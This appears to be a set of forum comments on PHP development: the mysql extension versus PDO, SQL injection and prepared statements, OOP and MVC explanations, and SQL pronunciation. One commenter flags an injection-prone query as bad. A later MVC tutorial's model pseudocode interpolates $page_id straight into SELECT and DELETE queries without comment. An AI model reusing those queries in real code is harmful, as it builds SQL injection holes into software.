I think you missed the point entirely. The outdated and horrid `mysql` extension is the *last thing* you want to teach "people just starting out." It is the worst possible way to interface with MySQL in PHP. **Period.** It is *not* "great for beginners," it's *poisoning their minds* with information that *will* cause them troubles later. You shouldn't be teaching it, and you most certainly shouldn't be putting the *least amount of effort possible* into doing so. Not only are you ignoring error conditions, you're using the *less-useless-than-useless* `foo() or die()` meme that encourages horrors and sloppy coding.
I think you're example reduces the readability of the code. I actually prefer the longer version with everything broken out (then again, I'm a sysadmin who likes php and not a full-time php developer)
I agree with you, I think a balance between readability and compactness is important. If less lines take more time to make sense of then they aren't improving development.
&gt; You sound like you have experience with this... Once upon a time, I cleaned up a nightmare in this general area for salary. &gt; Any particular pitfalls to watch out for? Yeah. Code that was written without unit tests in place is likely easier to discard than to repair. &gt; Any good references you've used for sorting all the encodings out? I had the benefit of almost ten years of customer data. I apologize that I have no shareable recommendations.
agreed, fortunately, with php a minor change like that will only increase performance in the rarest of exceptions. Which is why I write my codeigniter models like the OP.
Yeah, this is exactly the problem with noobs teaching noobs. Nothing good can come of it. It only propagates bad practices further and the web will be in a worse state than it already is for it.
The percent sign wildcard doesn't match an empty string. Therefore "%foo" will match oo, but not foo.
You don't need to. OOP in PHP is stupid. Let the downvotes commence!
I really do hope you're trolling.
Buckbova's right about mysqli or PDO. In my opinion, PDO would be a better thing for a *new* developer to learn. Why is PDO better for new developers? Because it uses the same *interface* for all of the available drivers. Regardless of whether you're using MySQL, SQLite, PostgreSQL, MSSQL, or anything else supported, it uses the *same* method names and the *same* order of operations. Both PDO and mysqli are superior to the ancient mysql extension for one other important reason: prepared statements with placeholders. Why are these important? Well, here, have some *bad* code: $foo = $_GET['foo']; $sh = mysql_query("SELECT * FROM Table WHERE foo = '$foo'"); Quick, what's wrong with this code? If you answered, "Why, it has an [SQL injection vulnerability](http://en.wikipedia.org/wiki/SQL_injection)," then you're right! Now, in the horror story of the mysql extension, there's only one way to mitigate against SQL injection: data sanitization and `mysql_real_escape_string`. Sanitization can only go so far. Sure, you can cast numbers, you can add regexes to certain fields, you can add basic other protections, but sometimes you can't really sanitize the data. It takes a *very long time* to learn how to do this effectively. So, that leaves escaping the string. Every time. Every single time. No exceptions. $foo_for_select = mysql_real_escape_string($_GET['foo']); $sh = mysql_query("SELECT * FROM Table WHERE foo = '$foo_for_select'"); What a glorious *pain in the ass!* It's ugly, it's error-prone, and it's easy to forget. This is where [prepared statements](http://us2.php.net/manual/en/pdo.prepare.php) come in. Here's a PDO example: $foo = $_GET['foo']; $sh = $pdo-&gt;prepare("SELECT * FROM Table WHERE foo = ?"); $sh-&gt;execute(array( $foo )); See that question mark there? See the array inside the call to `execute`? The question mark is a placeholder. The values passed to execute are substituted for each respective placeholder. They're also *automatically* escaped and quoted. This means that you'll *never* forget to escape your data, because the database library handled it for you. If things go well, you'll *never* build a SQL string by concatenation ever again. (Okay, maybe for `LIMIT` clauses, they don't accept quoted values.) (This is where I think PDO wins over mysqli for another reason -- mysqli doesn't have the happy pass-an-array-to-`execute` functionality. Instead you have to call [`bind_param`](http://us2.php.net/manual/en/mysqli-stmt.bind-param.php) *once and only once* with *all* of the parameters. This can be a usability nightmare.) In summary, the mysql extension sucks because it makes creation of secure code *hard*, and *the vast majority* of "tutorials" for it *completely* gloss over security issues, if they even mention them at all. There is *zero reason whatsoever* for new coders to consider using it. None, nada, zip, zero. PDO has been standard since PHP 5.1. "Everyone uses it" is *not* a valid excuse. It's only "popular" because it was the only option *in PHP4*, and code (and tutorials!) written for it *way back then* will still freaking work in it today. If someone goes out there and tries to learn how to connect to MySQL from PHP, they're going to come across one of *tens of thousands* of *horrible, outdated, insecure* tutorials. These things are a plague on the PHP community, and we should be doing *everything that we can* to show how things work in *modern* PHP. This means not making any more tutorials for the mysql extension, except maybe on how to stop using it.
He's absolutely right. Out Of Process execution in PHP is indeed stupid.
Had a large refactoring effort tonight, hopefully it fixes the indentation &amp; commenting issues.
OOP is like tiny programs in containers, MVC is the elegant organizing of.
Find a copy of "PHP 5 Objects, Patterns and Practice" and give it a read. The book is 6 years old but PHP 5 hasn't moved all that much so the bulk of the book is still good and current. It covers OOP, design patterns and I do believe also a chapter on MVC. I found the book to be very helpful.
You know... I've been considering using a framework for a long time. I gave Zend a shot a few times and got frustrated trying to figure things out on my own. Went back and forth while slowly coding my own "framework". But, I recently checked out CI and read through some of the manual and was surprised at the amount of info available. So, now I've put my own framework back on the shelf and am delving into CI. 
For starters, you should be referring them to the manual, not teach them on your own because most likely the things you know are wrong and based on bad practices. &gt;Any example or how this would lead to troubles down the road? Well, the mysql extension doesn't have support for prepared statements, so most likely your scripts will be susceptible to SQL injections, among other things. 
MVC is a pattern, and as such it usually "clicks", like you say, when you've fought your way again and again through a specific problem that this pattern adresses. If you've never had problems having data, business logic and chunks of HTML all over your script, then probably you don't see any clear advantage by using MVC. OOP, on the other hand, it's a complete programming paradigm, which you should really look into. Two very basic and useful concepts are encapsulation and inheritance. I am being non-technical now, because I think that there's a lot of CS-lingo when reading about these topics. Encapsulation allows you to define properties that define something that you want to work with, and functions to do that work. Procedurally, you would have variables such as personName, personAge, personAddress, personPostalCode, etc., and a function sendSnailMail with several parameters. With an OO approach, you would have a person object, with name, age, and address as properties that define a person. Address itself would be another object, with members like street, number, and postal code. The person definition (that's what a class is) also has a sendSnailMail method that already knows what data to use, since it's "inside" the person (thus the encapsulation). Inheritance is a way of creating things out of person (like man or woman, if you add gender as a property). EDIT: Text looks way longer than what one can see when typing in the reply box :P
I think the best way to learn OOP and MVC (and programming in general) is to write a large program from scratch without thinking about any of that stuff. When you have it working, read a book like [Code Complete](http://www.amazon.com/Code-Complete-Practical-Handbook-Construction/dp/0735619670), and you'll be introduced to all kinds of concepts that make your life much easier. Edit: I forgot the most important part. If you get into OOP and really feel like you don't need it, or that it makes your life more difficult, simply don't use it. Many people like to get religious and dogmatic about certain ideas in programming, but there's absolutely no reason to not just go with what works for your situation.
For web, MVC frameworks just split the functionality up across arbitrary lines for modularity. **Models** represent data structures and contain functionality for interacting with them. Think database-level stuff. Each instance of a model usually corresponds to a row in a database. **Views** are how the information is presented. Usually just a template with some light processing. **Controllers** handle mapping models to views. Example: I go to foo.com/cars/123/details to get some details on a sweet pinto. The **controller** sees this url and goes "Oh, he's looking for a model of type *Car* with a unique id of *123*, and he wants to view the details about it (rather than a summary, gallery, etc.)" It then asks the *Car* **model** for an instance of *Car* with an id of *123*, and the *Car* model handles fetching it out of the database, as well as any additional processing. The controller doesn't care how this is done, just that it gets the data it needs. Once it has this, it looks up a "details" **view** for the model type *Car*, which typically is just a template with some light processing around it. It sees a spot for %color% and %year% in the HTML, so it fills in those details with the data it got from the model, then sends it down the pipe.
Whether or not MVC is elegant depends largely on your usecase. MVC a design pattern particularly suitable for web applications, but it's not appropriate for everything and there are plenty of other patterns out there. 
OOP is nice if other people are ever going to be maintaining or contributing to your code. By chunking your program into inter-working objects, a programmer doesn't have to understand how the whole thing works in order to work on a certain part of it. 
It's a piece of art. One thing I love about CI is that there are multiple ways to achieve the same end result, i.e. it's very flexible. Looking through you're code I'm realizing all sorts of cool things that I've never done. Good job!
I was much like you a few years ago. I could make PHP do whatever I wanted, so I wasn't able to grasp the concepts/advantages of OOP and MVC. What really helped me was spending a few months with Rails. I was learning a totally new language+framework, so I couldn't just fall back on the old ways I'd always done things, nor was I distracted/confused by thoughts of "why not just do ____?" Also, Ruby, by design, pretty much forces you to use OOP. I don't want to turn this into a PHP v. RoR debate, because that's really not my point. Both have their strengths and weaknesses, but the change in perspective really helped me to understand MVC &amp; OOP because it forced a clean slate in which I had to learn those things in order to use the language/framework. 
I started programming with PHP 3 back when it was pretty much the standard to do everything functionally. I don't even remember if it had OO support then. OO support wasn't particularly good until 5 anyway. One of the things that helped me learn as I moved into object oriented programming was rewriting small parts of applications as classes and methods. Also, everything made a lot more sense after I learned some Java and C++. I don't particularly care for either language, but something like Java uses textbook implementation of OOD (literally) and a lot of the concepts become more clear in that context.
&gt;They're also automatically escaped and quoted. Actually, that's not what happens. The original query is compiled, and since the query has been compiled there's no SQL statement to break out of. No SQL = No SQL Injections.
I am not, OOP in PHP was always a pretty silly concept. There's only a handful of situations where it makes sense and most people think that just because they use classes that their code is "OOP".
Just do what most of us fledglings did in the beginning. Start off using classes as function containers. Then start organizing your function containers into categories like Models, views and controllers. Then learn (and continue to learn the rest of your life) the proper way to organize your files, and migrate your classes into full fledged objects and away from function containers. Personally, I'm still learning, and been doing it for a number of years now (less than three though).
Keep in mind that OOP and MVC are concepts rather than "things." Re: MVC: For instance, you can make calls to the database from the View or you can echo markup from a Model, if you so choose. These things are not "illegal" when it comes to the language but highly discouraged when practicing MVC. To take it a step further, there are different variations on the MVC "pattern" from language to language. (See http://amix.dk/blog/post/19615#Model-View-Controller-History-theory-and-usage) Re: OOP: I once read that Metal Gear Solid for PS2 was "written entirely in C," which was apparently a big deal because that means it's all written "procedurally." (Note: I don't know C so I can only give this little anecdote.) When you have a LOT of code and a LOT of "things" that you get to fake with arrays and the like, rather than with fancy OOP objects, there's a lot more room for bugs and spaghetti code. Objects (OOP) make large code bases a goddamned joy to work in because of the compartmentalized nature of the code. You can literrally think of the code as things that can be interlocked by various methods. You should *really* push yourself to become familiar with these concepts so to stay relevant. I personally wouldn't want to work with a dev who wasn't at the very least competent with MVC/OOP, despite how they felt about either. 
I am also a self taught php programmer. I currently use MVC for most of my projects, with [CodeIgniter](http://codeigniter.com) being my framework of choice for its simplicity and basic class structure for defining pages. Plus, the built in libraries make things 10x easier for my workflow. I like MVC because it forces me to separate out my code/design, keeps the code organized and makes things easy to understand for new people. The MVC paradigm also organizes my projects into API layers(database code, template/view code, and controlling logic to connect the database results to my templates/views). After programming procedurally for 3 years and switching to OOP, I find my first draft code contains less errors and is a lot easier to read on first glance then my first draft procedural code. Over time, classes just make more sense when you are dealing with large applications that do many things. Classes are also great for managing independent "states" of code. For example, if you have a set of functions to connect and query a database, it is simpler for me to define a class to manage that DB connection then let PHP manage it for me. In a class you can define class-specific variables and functions to connect to your database and manage the connection details/state. Classes also allow you to do some simple *magic* IE: functions that are automatically called when you instance/destroy a class and specific magic methods that make it easy to solve specific problems. Here is an example class I wrote a few months ago that uses one of those magic methods (__call): &lt;?php Class Soapy { public $error_num = 0; public $error_msg = ''; public $wsdl = ''; public function Soapy($params=array()) { if(isset($params['host']) and isset($params['name'])) { $this-&gt;wsdl = 'http://'.$params['host'].'/'.$params['name'].'.asmx?WSDL'; } } public function __call($name, $arguments) { // reset errors/msgs $this-&gt;error_msg = ''; $this-&gt;error_num = 0; try { // load args array, because the arguments variable contains an array of all passed arguments $args = array(); if(isset($arguments[0])) { $args = $arguments[0]; } // create a new instance of the SoapClient library $client = new SoapClient($this-&gt;wsdl); // Call a function on the remote service $return = $client-&gt;$name($args); // load result into php object $result_name = $name.'Result'; // return the data return simplexml_load_string($return-&gt;$result_name-&gt;any); } catch(SoapFault $e) { $this-&gt;error_msg = $e-&gt;faultstring; $this-&gt;error_num = $e-&gt;faultcode; return false; } } } With this class I can connect to and execute a soap function on a remote soap service by calling a non existant function on the class, like so: $soap = new Soapy(array('host' =&gt; 'my.webservice.url', 'name' =&gt; 'service_name')); $data = $soap-&gt;remote_soap_function_name(array('SOAP_ARGUMENT_NAME' =&gt; 'SOAP_ARGUMENT_VALUE')); ... With the class, I can skip writing separate functions to process every soap service function I need to consume and because I wrote it as a class I can create an infinite number of soap connectors ($soap1, $soap2, $soap3 ...) that each point to their own soap services. Also, because I instanced the class every time I create a new $soap variable, I can manage their error states independently and can easily detect/retrive errors by reading the respective error_num/error_meg variables on that class (EG: $soap-&gt;error_msg ) and I accomplished all of this with 50 lines of code. I hope this helps you understand OOP a bit more, feel free to ask me any questions or post any critiques of my class.
The thing I have found with MVC, is that it is a nice concept, and it just needs diving into some real examples to see how it works in practice. The trouble is, very few applications out there do it properly - there is much leakage between the M, V and C layers. What that means is that you should be a sceptic when looking at code; don't assume that it is a good example of MVC just because it is claimed to be. It took me a while to realise that the model is not just a view onto a database table, but is a *model* of a "thing" in your application. It will often be represented in a single table, but may have no tables, or multiple tables. Functionality specific to that model should also be in there, but often ends up pushed into controllers (which confuses a lot of code).
readability is a matter of formatting in this case. I could have just as easily written: return $this-&gt;db -&gt;order_by ('id', 'DESC') -&gt;get ('blog', $limit, $offset) -&gt;result_array(); Honestly if you find line after line of $this-&gt;db-&gt;X more readable, then go for it. But assigning the get to a varaible and then calling and returning the result_array() method is just silly.
I think mvc is a lot easier to understand than oop. Here is mvc in a nutshell function model_data(){ return array(1, 2, 3); } function list_view($data){ $list = array('ul'); foreach($data as $item){ $list[] = '&lt;li&gt;'. $item .'&lt;/li&gt;'; } $list[] = '&lt;/ul&gt;'; return implode('', $list); } function controller(){ echo list_view(model_data()); } //execute controller(); //should give you a list The draw to mvc is that you should be able to replace any one of those components and if you're passing around the same datatypes, you should be fine. So imagine if you had a new way to get list data, something like get_all_names which returned an array that looked like array('emehrkay', 'thespite', 'reddit', 'etc') your list_view View woould still work.
Thanks :) For sure. CI is a great framework - do you have any project on github?
Is it not more correct to say that the controller says, "oh, he's looking at cars - I know a model that can give me cars"? It is just that the "cars" in the URL will be invoking a *controller* called "cars", and that may (or may not) use a model called "cars". The name in the URL and the model name are not directly linked, just because they *happen* to have the same name. The controller sits in the middle and makes the decisions on what (and how) models to use.
I'm in the same boat, while OOP makes sense to me I haven't had any reason come up that I thought to myself OOOH Yes, I need to do that OOP style. As for MVC, I get MVC, and I fucking hate it. It just seems like so many hoops to jump through to accomplish something that I could do so much faster on my own.
When I was starting out with MVC, no one explained it in a way I understood, I wish someone had written it out like this, (this is from a PHP MVC standpoint as per Cake, CI, rails): None of these examples will work in real frameworks they're just PHP psudocode. **Controllers**. Each controller is a collection of functions (aka actions or methods) called a class. The class' name usually relates to a database table, but not always. So for example, if you had a table in your database called 'page' in your database you might have a controller with various actions that a user can access related to that class (such as viewing, deleting and editing). Your controller class has various actions or methods such as edit, view, delete etc. Each of these actions is a chunk of sub-code like any other function. Example &lt;?php class page{ function view() { //view page code here } function delete() { // delete page code here } } Now, if you wanted to access the 'view' chunk of code on your 'page' controller, you would go to this url: www.yoursite.com/**page**/**view**/ That would tell your framework to load up the collection of blog functions then execute the one called view. You might have many different controllers with various actions within one website. Some frameworks offer an easy way to get variables into your code via the url. Let's say you wanted to load a page based on an database ID supplied within the url. In this example the ID is 31234 www.yoursite.com/**page**/**view**/31234 &lt;?php class page{ function view($page_id) { //now we have a $page_id varibale which we can use to select certain stuff from the database } } Controllers never have direct database related code or html within them. Controllers are to react to user interaction (in this case sending of a url, but also cookies and GET/POST data) and based on that user information access various parts of the application such as database stuff (via a model, which we'll come to later), then pass that stuff into the views (we'll come to that later). GET,POST and URL stuff should only ever be accessed within the controller. **Models** Controllers sometimes are related to database tables. Models, almost *always* pertain to database tables. If we carry on with the 'page', example, i'll give you an example of a basic model. Again this is basic, pretend code. &lt;?php class page_model{ function get_from_id($page_id) { $database-&gt;query("select * from pages where id=$page_id"); return $database-&gt;result; } function delete($page_id)) { $database-&gt;query("delete from pages where id=$page_id"); } function get_all() { $database-&gt;query("select * from pages"); return $database-&gt;result; } } As you might be able to tell, the model is just a set of actions related to manipulating a certain type of data. In this case we're manipulating a database table. Models should never have HTML or access GET or POST data. Models should be the only place you access your database from in your application specific code. **Models and Controllers** This is how the relationship between a model and controller might look. &lt;?php // this is our controller class page{ function view($page_id) { $page_data=Page_model-&gt;get_from_id($page_id); } } If a user went to the url www.yoursite.com/page/view/453 Firstly the page controller would be loaded, then the view function would be executed with the variable from the url (453) set as a parameter. Then the parameter passed into the page model and the page database record returned. **Views** Views are your presentation data, mostly HTML. Views should never access the database or models. Views should never access get or post variables or cookies and should only contain the most basic of PHP functionality such as echo and loop control structures. I don't really need to show what a view looks like because it's just HTML and PHP, but here's an example of what one might look like &lt;!-- a_lovely_view.php --&gt; &lt;title&gt;&lt;?php $page_title;?&gt;&lt;/title&gt; &lt;h1&gt;&lt;?php echo $page_heading;?&gt;&lt;/h1&gt; &lt;?php echo $page_content;?&gt; The final part of the jigsaw is to get variables from the controller, into the view **Models, Controllers and Views*** &lt;?php // this is our controller class page{ function view($page_id) { $page_data=Page_model-&gt;get_from_id($page_id); $data=array(); //create a blank array $data['page_title'] = 'Hello everyone'; $data['page_heading'] = 'This is the heading'; $data['page_content'] = 'The Page ID requested was '.$page_id; // now push these variables using an array into the view we made above view('a_lovely_view.php',$data); } } So if our user went to www.yoursite.com/**page**/**view**/1234 the result would be &lt;title&gt;&lt;Hello everyone&lt;/title&gt; &lt;h1&gt;This is the heading&lt;/h1&gt; The Page ID requested was 1234 I hope that simplifies this for you. As an absolute beginner, I'd suggest CodeIgniter because its very, very simple.
OOP is like a collection of little boxes that have functionality contained. Sometimes those inner functions can impact outside boxes, but it really shouldn't. here is a simple oop example class animal{ function make_noise(){ echo 'arggghh'; } } class cat extends animal{ function make_noise(){ echo 'meow'; } } class dog extends animal{ function make_noise(){ echo 'woof'; } } $cat = new cat(); $dog = new dog(); $wut = new animal(); $cat-&gt;make_noise(); //meow $dog-&gt;make_noise(); //woof $wut-&gt;make_noise(); //arggghh //this function only accepts animal objects function noise_maker(animal $animal){ $animal-&gt;make_nose(); } $std_obj = new stdClass(); noise_maker($cat); //meow noise_maker($std_obj); //throws error as std_obj is not a child or is an animal -- this right here is the power of oop 
Mind me asking why you've made your class variables public?
OOP is a strange one. One day you'll just go 'This shit needs to be OO'. And then you'll figure out so much more can be OO... and then half your shit will be OO.
It was never one of the ideas that just "clicked" for me. I dived headlong into it, wrote a couple of quick projects using OOP (with the help of a friend), and by the end of that I was feeling confident with it. I would describe that as it simply just gradually sliding into place (no innuendo), as opposed to clicking in Perhaps try getting into a framework like Symfony (1.4) or CodeIgniter; both have fantastic documentation and generally you can learn OOP from a practical perspective while learning these. I would suggest Symfony 2, but it seems like it takes things to the next level and probably would just be more complicated for learning than what you're willing to accept.
..assuming you know how a webservice works, or xml for that matter. Actually, this code is interesting. I'm going to use this some day with a slight modification. Does it make a difference if the encoding is literal/encoded or rpc/document ? I'm guessing it does but that's ok.
Why does this sound like a troll? He's learned these platforms, but never cared to learn why they were important? No, he's wasting our time, and getting a kick out of it. 
This is what I did... then I fell in love with ruby and haven't written another line of PHP since.
I don't think you're invoking *a* controller called "cars", you're relying on *the* controller to make that mapping. But yes, you make an important point that deserves some clarification and reinforcement: &gt; The controller sits in the middle and makes the decisions on **what view to render** and what models to use (and how to use them). You can have a view with no models, for instance.
Eh, could be, but I'm willing to give OP the benefit of the doubt. You can cargo cult your way through a lot of stuff. I'm guessing OP's been doing *some* OOP without even realizing it.
I've always gone with "Sequel" as well.
It's honestly however you want. People say both, when you say sequel or S-Q-L, everyone knows what you're talking about.
&gt;I forgot the most important part. If you get into OOP and really feel like you don't need it, or that it makes your life more difficult, simply don't use it. Many people like to get religious and dogmatic about certain ideas in programming, but there's absolutely no reason to not just go with what works for your situation. I can't even tell you how much I disagree with this. I'm sorry, if OOP is making someone's life more difficult it's because they still don't understand it. The ones who plow through and learn end up being better programmers for it- the people who take your advice end up being the reasons why PHP has such a bad reputation.
This is a simplified example of my soap class, it strips out the custom error checking that is dependent on the soap return, benchmarking code and debug logging calls from the full class. The error variables are public so if a function returns false you can hit the class for the code and message as to why the call failed. The wsdl variable could be private, but I left it public because I just copy-pasted the first variable to make the the other two. 
Your formatted code is perfectly readable and has persuaded me to explore this method of coding. Thank you for taking the time to elaborate on your original post.
Just FYI, the 3rd edition came out June 2010 http://www.amazon.com/Objects-Patterns-Practice-Experts-Source/dp/143022925X/ref=sr_1_3?ie=UTF8&amp;s=books&amp;qid=1302134786&amp;sr=1-3
Either. There's no "right" way, as long as people understand what you're referring to. For your personal amusement, start calling it "Squirrel" and see how long it takes for someone to correct you. XD
Another. Although, for a while I would say "My Sequel" and "Postgres S-Q-L." I don't know why, but it was a mannerism I picked up from a friend. I know say "Postgres Sequel."
The code requires a web service that uses a WSDL and in practice I have not encountered a SOAP server where this code did not work as expected given a valid WSDL. This code will not work on more advanced services (eg: services that take a complex type as input) without a slight modification. Also, this code was written to consume Microsoft ASP.Net web services, so that is about the extent of the testing that I have done with it. If I remember correctly, I also tested it with Amazon web services, but I switched to using REST on aws because the option was available.
This is true only if native prepared statements are used. PDO has to emulate them for some drivers, and you can turn on emulation manually if needed.
S-Q-L... but for CSV (comma separated values) I always say see-see-va.
LOL I like both. I'm probably one of the few people out there who feel that way, but I do. I tend to end up writing a lot of small apps that get distributed/sold to end users who want to run them on shared hosting, so PHP is a bit more practical for most of the work I do, but I have developed and do maintain a few fairly large Rails sites.
Correct. However, it is intended to be used for prepared statements, which is why it is better to describe the method according to its purpose. And given the context (making mysql queries), it certainly isn't emulating this functionality, and therefore not escaping or quoting it. And given that the drivers that do not support prepared statement is not in popular use, there would make little sense in mentioning the behaviour of prepared statements with these drivers as the primary focus. 
think of MVC as cooking dinner first you get your ingredients ready, then you cook, then you present
&gt;if OOP is making someone's life more difficult it's because they still don't understand it. I'm suggesting the OP understand it deeply enough that he reaches the point of being able to rationally decide whether or not it's the right tool for the job. It sounds like maybe you haven't reached the point yet either.
Actually the most widely accepted pronunciation is "[post-gres-Q-L](http://www.postgresql.org/files/postgresql.mp3)"
You guys are confusing controllers with routing. Routing is routing the cars/123/details to the correct controller, which could be something like: "CarController" and passing it the "arguments" if you will of 123/details to get the correct output. CarController would then look at the arguments and query the model for cars correctly. A better example of the difference would be like: foo.com/search/cars/123 Search would be the SearchController possibly, which would see cars/ and 123, and know to query the cars model with 123, the routing provides this information of passing arguments to the correct controller. People don't differentiate the two very well because in some frameworks like Rails, using convention makes the routing direct to the correct controller automatically and they don't think of the routing portion, but you can override that with more complex controllers. 
As someone who is currently undergoing MVC "clickage", so to speak, I know the frustration. The thing that really made it all seem "real" to me was this [little screencast](http://net.tutsplus.com/tutorials/php/create-your-first-tiny-mvc-boilerplate-with-php/) from Nettuts+. I'd been following off and on their ["Codeigniter from Scratch"](http://net.tutsplus.com/sessions/codeigniter-from-scratch/) series, and I think that that helped "prep" my mind for the concepts, especially the first few screencasts. Then, seeing it built from the ground up with the "TinyMVC" screencast helped me see how it worked on a lower level. I'm currently working on a couple sites powered on my own implementation of the TinyMVC described in the screencast. As for object orientation, the basic idea I needed to get was "objects are essentially collections of functions + related data". Most tutorials I read focused on the more "abstract" view of objects, like "Say a bicycle is an object. It's ability to pedal or brake are methods, and it's wheel size is a property." That was a little *too* abstract for me, and while I understood it in an "academic" sense, I never really got how I'd use it. Once I groked the "functions+data" idea, it became a lot easier. To give an example, I'm currently working on designing a "sessions" object for my aforementioned projects, and I started by thinking "okay, what things might I do involving sessions?"-"make a session, check a user's password matches, protect against session hijacking and fixation, etc." Now, those will be my methods. Then I thought "okay, what kinds of data will I always need for these functions"-"username, password, ip address, database connection, etc." Those are my properties. Also, I worked with JavaScript. Quite a bit. As it's *very* object-oriented (almost everything is an object, all functions are methods of the global object, all global variables properties of the global object), it helped me think more object-orientedly. It takes a while though. Try to make things as objects. Try playing with a simple MVC framework. It will come, eventually.
SQL, never Sequal, although I never correct anyone. The one thing that I will correct people on is if they write out Sequal. I can let C Sharp slide because technically # is not a sharp even tho # is the proper notation. I almost wish there was an alternate notation for C++ as most search engines will ignore the pluses.
He is correct in what he is saying, I just wanted to point out why people choose OOP and MVC. Also that the two are not mutually exclusive of course(I think most people realize that, just wanted to state it). OOP first: With procedural code you are relying on functions to be called in a sequence. You are still doing this with OOP in the end game of how it gets executed, however it is setting it up a "mental model" if you will that gets away from this straight procedural function calling line of thinking, for a few reasons: A. When you have an object, and you are reusing that object in several parts of your code, but down the line because of a bug or feature request, you can change the object and hopefully by clearly defining your object, not break the rest of your code which already relies on that object. You can also theoretically completely rewrite the object, say an XML parser, with a newer, faster, better XML parser, and still maintain the object compatibility which means you only change your object and the rest of your code hopefully still "just works". B. With object inheritance you end up "hopefully" writing less code because you are only writing the differences between similar objects, and not rewriting all your code for similar types of objects. The best example of this is the animal object: If you write a base object which is an animal, then you put all your code for functions such as checking if that animal is alive or dead, or checking that animals colors. Thusly your animal object can have: is_alive() and get_color(), functions in it. Then you can write an object that inherits that which is more specific, such as a bird object. Bird inherits animal, so you get the animal functions already there for you, but you can add some new ones such as: is_able_to_fly(), and is_migratory() So you don't have to write the original functions checking life or death or color. Lastly you can then have a Penguin object that inherits the bird object, so you get the migratory and fly functions there for you already, and you could write some other ones like: get_waddle_speed() This means you now can create a penguin objects and have access to all the functions above it including the ones specific to the penguin. It is much cleaner and you reduce the amount of code you write, where as functionally you would have to have a function where you passin in properties for each variable and it would turn into spaghetti code. 
Now to go into MVC benefits a bit: MVC really is a design pattern like he said, You could use MVC design patterns or not and still accomplish the same product, just like you could use OOP or not and still accomplish the same project, its more about cleanliness and working with teams. MVC is a good design pattern mostly because it sets some basic rules, of the controllers acting on views and models. It really just allows someone familiar with other MVC frameworks or types to jump into a code base they haven't worked with and have an idea of where something is located that they are looking to work on, where as without the design pattern the piece of code they are looking for could be wherever the whim of the original programmer who wrote it decided to put it. The other benefits of MVC frameworks is that if you follow convention of the framework, a lot of the work you might normally create and work on could be done for you already. In rails for example, if you follow their database convention, then you can write very little code because the framework puts a lot of the basic stuff together for you. When you are working on many projects throughout the years, any increase in speed of creation and less work on the programmer can be a godsend. 
&gt; Objects (OOP) make large code bases a goddamned joy to work in because of the compartmentalized nature of the code I used to think this way until I started seeing proliferation of factories and helpers for the simplest of things. And the forced generalizations... eesh. I can usually kinda tell what they want to do, but damned if I can easily follow how they did it. You can get very crappy very fast with OOP. You can get good code in C if you know what you're doing. Personally, I've always tended towards a hybrid model... leaning towards OOP for much of it. Even back when I was doing assembly programming... we just didn't call it OOP then or have semantics for it. We just learned to associate a set of subroutines with certain data structures and be careful about it.
Thanks for sharing. I am a budding CodeIgniter programmer myself and your code will help me a lot in my learning. CodeIgniter has great documentation but a real-life example is even more helpful in understanding how to put everything together. 
Okay, that's all fine and good... now, can you re-explain that so someone new to coding in general can understand it? :) This is why I frequently fall back to the incorrect-but-not-inaccurate explanation.
First, ignore the code examples on the page. They are fairly bad. The reason you don't grok OOP is because of examples like these. What you want is a good solid book. [Patterns of Enterprise Application Architecture](http://www.amazon.com/gp/product/0321127420?ie=UTF8&amp;tag=martinfowlerc-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0321127420) PoEAA sounds imposing, but it's really good. I highly recommend it. I also recently wrote up [an article on Data Mapping](http://www.jasonlotito.com/programming/object-oriented-programming-data-mapping/) that you might be interested in reading. If you have any questions, you can ask. Basically, for me, when I finally groked OOP, was when I was reading an article on observers, and how that pattern works, and I started to get it. I'm still learning. I'm only now getting over my need for getters and setters (You don't need them, they are bad, stop using them). But yeah, the reason most OOP articles are bad is because most people using objects are merely using them as namespaces for functions and variables. If you have any questions, let me know.
&gt;now, can you re-explain that so someone new to coding in general can understand it? What part exactly? Do you want me to explain the concept of prepared statements, or do you want me to reformulate my previous response? And to whose benefit, yours or OP?
I've been in the business for 12 years. Never heard anybody call it anything but "sequal". If somebody actually said "ess-cue-ell", I probably wouldn't bother to correct them, but I'd also probably be expecting them to be calling the big blue e "their internet" in their next statement. 
When I first started out in PHP I didn't have any understanding of OOP at all. It wasn't until I decided to learn Python that OOP clicked in my head. I feel the reason why its harder to understand in PHP is because the core language itself is not OO. While in another language such as Python everything is an object. My recommendation if PHP is your only language is to learn a 2nd one. I've found that every time I've learned a new language it's helped me to understand the ones that I already knew more.
I always say see-quel, but I know its wrong... its just become habit now :(
Is routing the M, the V, or the C? ie. If routing isn't part of the controller, then what is it part of? I think this is just semantics when talking about web frameworks. 
Ok I implemented a more secure system, thanks! Say I have a sidebar on my website, and I have a set of pictures on that are cropped, and when clicked on are opened to show the full picture. Is there a way to make them enlarge over the current page (think Facebook's new 'lightbox'? picture mode)
I say "Sequel". SQL was originally created for an IBM project in the 70s and they called it "SEQUEL". Had to change the name to "SQL" due to a trademark dispute. But the orig intent was "Sequel", so I call it that. Either way is equally understood though.
Rhetorical question. :) Don't worry about it.
Well, yeah. A hammer isn't a particularly elegant solution for driving screws, and even though you could do it if you tried hard enough, you're not using the right tool. Why would you use MVC outside of the area for which it was designed?
Routing handles URL structure. Technically you could have mvc with no routing, but that would be pretty nasty. Every or almost every mvc framework will have built in routing to allow for a manageable file system
It's worth noting that this type of URL handling isn't universal. Django, for example, doesn't autoroute URLs out of the box.
For the MVC frameworks I've had experience with (Rails, CodeIg, Django), there's only one "controller", and I'd put routing under its umbrella. Mind you, I don't have much experience with *pure* MVC architectures outside of the web context.
IMO, You don't pronounce an acronym if it requires adding assumed vowels.
&gt; "Once upon a time, I cleaned up a nightmare in this general area for salary." Oh, that bodes well for me! &gt; "Yeah. Code that was written without unit tests in place is likely easier to discard than to repair." &gt; "I had the benefit of almost ten years of customer data. I apologize that I have no shareable recommendations." No worries. Good recommendations nonetheless. I'll see about grabbing some articles in various languages online or something and using them to test various encodings until we get around to translating.
